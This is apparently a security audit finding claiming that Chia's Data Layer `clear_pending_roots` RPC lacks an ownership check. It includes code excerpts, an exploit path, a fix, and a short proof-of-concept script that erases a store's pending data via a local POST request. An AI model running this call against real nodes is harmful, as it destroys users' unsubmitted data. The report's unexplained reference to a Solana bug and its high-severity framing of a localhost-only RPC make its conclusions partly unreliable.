### Title
Missing Ownership Check in `clear_pending_roots` Allows Unauthorized Erasure of Any Store's Pending Data - (File: `chia/data_layer/data_layer_rpc_api.py`)

### Summary

The `clear_pending_roots` RPC handler in `DataLayerRpcApi` directly clears pending root data for any caller-supplied `store_id` without verifying that the caller owns the target Data Layer singleton. This is structurally identical to the reported Solana bug: a destructive state-mutation handler omits the ownership/authorization check that the analogous write handler (`batch_insert`) correctly enforces. Any process that can reach the Data Layer RPC port can permanently erase another store owner's unsubmitted data changes.

### Finding Description

**Root cause — missing ownership guard in `clear_pending_roots`:**

```python
# chia/data_layer/data_layer_rpc_api.py  lines 552-556
@marshal()
async def clear_pending_roots(self, request: ClearPendingRootsRequest) -> ClearPendingRootsResponse:
    root = await self.service.data_store.clear_pending_roots(store_id=request.store_id)
    return ClearPendingRootsResponse(success=root is not None, root=root)
``` [1](#0-0) 

The handler passes `request.store_id` directly to `DataStore.clear_pending_roots`, which deletes all `PENDING` and `PENDING_BATCH` root rows for that tree:

```python
# chia/data_layer/data_store.py  lines 861-875
async def clear_pending_roots(self, store_id: bytes32) -> Root | None:
    async with self.db_wrapper.writer() as writer:
        pending_root = await self.get_pending_root(store_id=store_id)
        if pending_root is not None:
            await writer.execute(
                "DELETE FROM root WHERE tree_id == :tree_id AND status IN (:pending_status, :pending_batch_status)",
                ...
            )
    return pending_root
``` [2](#0-1) 

**Contrast with `batch_insert`, which correctly enforces ownership before any mutation:**

```python
# chia/data_layer/data_layer.py  lines 403-406
# check before any DL changes that this singleton is currently owned by this wallet
singleton_records: list[SingletonRecord] = await self.get_owned_stores()
if not any(store_id == singleton.launcher_id for singleton in singleton_records):
    raise ValueError(f"Singleton with launcher ID {store_id} is not owned by DL Wallet")
``` [3](#0-2) 

`clear_pending_roots` performs no equivalent check. The `store_id` is fully attacker-controlled and is never validated against the wallet's owned singletons.

**Exploit path:**

1. Attacker reaches the Data Layer RPC port (bound to localhost by default; reachable by any local process, or remotely if the operator exposes the port).
2. Attacker calls `POST /clear_pending_roots` with `{"store_id": "<victim_store_id_hex>"}`.
3. `DataLayerRpcApi.clear_pending_roots` calls `data_store.clear_pending_roots(store_id=victim_store_id)` with no ownership check.
4. All `PENDING` and `PENDING_BATCH` root rows for the victim's store are deleted from the SQLite database.
5. The victim's unsubmitted data changes — which may represent hours of accumulated `PENDING_BATCH` inserts/deletes not yet published on-chain — are permanently lost.

### Impact Explanation

**High — Corruption of Data Layer root/store state with direct security impact.**

Clearing a store's pending roots destroys all locally accumulated but not-yet-on-chain data changes. For a store in `PENDING_BATCH` mode (the multi-step batch workflow), this silently rolls back the local Merkle tree to the last confirmed on-chain root, discarding all intermediate work. The victim's Data Layer singleton continues to exist on-chain, but the local state diverges: the node believes the store is at the last confirmed root while the operator may have intended to publish a different root. Any downstream consumers relying on the Data Layer store's data (e.g., offer settlement, proof-of-inclusion verification) will receive stale or incorrect data.

### Likelihood Explanation

The Data Layer RPC has no per-request authentication; access control relies entirely on network binding. Any co-located process (or remote caller if the port is exposed) can issue this call. The `store_id` of a target store is observable from public chain data (launcher IDs are on-chain). The attack requires no keys, no privileged access, and no cryptographic capability.

### Recommendation

Add the same ownership guard used in `batch_insert` to `clear_pending_roots` in `DataLayerRpcApi`:

```python
@marshal()
async def clear_pending_roots(self, request: ClearPendingRootsRequest) -> ClearPendingRootsResponse:
    # Verify the caller owns this store before clearing
    owned = await self.service.get_owned_stores()
    if not any(request.store_id == s.launcher_id for s in owned):
        raise ValueError(f"Store {request.store_id.hex()} is not owned by this wallet")
    root = await self.service.data_store.clear_pending_roots(store_id=request.store_id)
    return ClearPendingRootsResponse(success=root is not None, root=root)
```

Alternatively, route the call through `DataLayer` (as `batch_insert` does) so the ownership check is enforced at the service layer rather than the RPC layer.

### Proof of Concept

```python
import aiohttp, asyncio, json

async def wipe_victim_store(rpc_port: int, victim_store_id: str):
    url = f"http://127.0.0.1:{rpc_port}/clear_pending_roots"
    payload = {"store_id": victim_store_id}
    async with aiohttp.ClientSession() as session:
        async with session.post(url, json=payload) as resp:
            result = await resp.json()
            print(result)  # {"success": true, "root": {...}}  -- victim's pending root erased

asyncio.run(wipe_victim_store(8562, "<victim_launcher_id_hex>"))
```

Any process on the host (or any remote caller if the port is exposed) can call this with an arbitrary `store_id`. The `DataLayerRpcApi.clear_pending_roots` handler at line 554 passes the attacker-supplied `store_id` directly to `DataStore.clear_pending_roots` with no ownership verification, permanently deleting the victim store's pending root rows.
